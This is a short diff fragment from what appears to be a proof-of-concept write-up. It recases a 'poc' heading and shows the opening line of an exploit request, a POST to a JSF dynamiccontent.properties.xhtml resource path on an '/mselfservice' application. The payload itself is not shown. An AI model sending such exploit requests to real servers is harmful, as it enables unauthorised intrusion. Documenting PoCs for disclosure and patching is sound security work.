@@ -6,7 +6,7 @@
 fid="tPmVs5PL6e9m5Xt0J4V2+A=="
 ```
 
-## poc
+## POC
 
 ```
 POST /mselfservice/javax.faces.resource/dynamiccontent.properties.xhtml HTTP/1.1
